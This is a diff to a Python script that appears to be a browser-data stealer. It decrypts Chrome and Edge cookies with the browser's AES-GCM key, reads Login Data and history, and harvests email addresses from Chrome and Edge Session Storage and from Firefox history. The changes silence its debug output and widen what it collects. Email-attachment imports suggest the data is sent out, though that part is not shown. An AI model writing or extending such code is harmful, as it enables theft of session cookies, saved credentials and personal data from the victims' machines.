@@ -12,6 +12,8 @@ from Crypto.Cipher.AES import new, MODE_GCM
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders 
+import urllib.parse
+from pathlib import Path
 import json
 
 USERNAME = getpass.getuser()
@@ -36,10 +38,10 @@ def decrypt_value(encrypted_value, key):
     try:
         cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
         decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
-        print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
+        # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
         return decrypted_value.decode()
     except Exception as e:
-        print(f"Decryption failed: {e}")
+        # print(f"Decryption failed: {e}")
         return None
 
 def chromEdgeOnly(chrome_path, email_pattern):
@@ -62,6 +64,17 @@ def chromEdgeOnly(chrome_path, email_pattern):
                 except:
                     pass
             conn.close()
+
+        ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
+        tssDatPath = os.path.join(chrome_path, profile, f"ssdat-{USERNAME}-{profile}-chrome")
+        if os.path.isdir(ssDatPath):
+            try:
+                db = leveldb.LevelDB(ssDatPath)
+                for key, value in db.RangeIter():
+                    decoded = f"{key.decode()} {value.decode()}"
+                    emails.extend(re.findall(email_pattern, decoded))
+            except Exception as e:
+                print(f"ERROR PARSING SESSION STORAGE : {e}")
 
         lDatPath = os.path.join(chrome_path, profile, 'Login Data')
         tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat-{USERNAME}-{profile}-chrome.db")
@@ -88,7 +101,8 @@ def chromEdgeOnly(chrome_path, email_pattern):
             cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
             for val in cur.fetchall():
                 try:
-                    matches = re.findall(email_pattern, val[0])
+                    decoded_string = urllib.parse.unquote(val[0])
+                    matches = re.findall(email_pattern, decoded_string)
                     emails.extend(matches)
                 except:
                     pass
@@ -109,7 +123,7 @@ def chromEdgeOnly(chrome_path, email_pattern):
                 if encrypted_value is None or len(encrypted_value) == 0:
                     continue
                 decrypted_value = decrypt_value(encrypted_value, decrypted_key)
-                print(decrypted_value)
+                # print(decrypted_value)
             
             conn.close()
 
@@ -161,7 +175,8 @@ def firefox(firefox_path, email_pattern):
             cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
             for val in cur.fetchall():
                 try:
-                    matches = re.findall(email_pattern, val[0])
+                    decoded_string = urllib.parse.unquote(val[0])
+                    matches = re.findall(email_pattern, decoded_string)
                     emails.extend(matches)
                 except:
                     pass
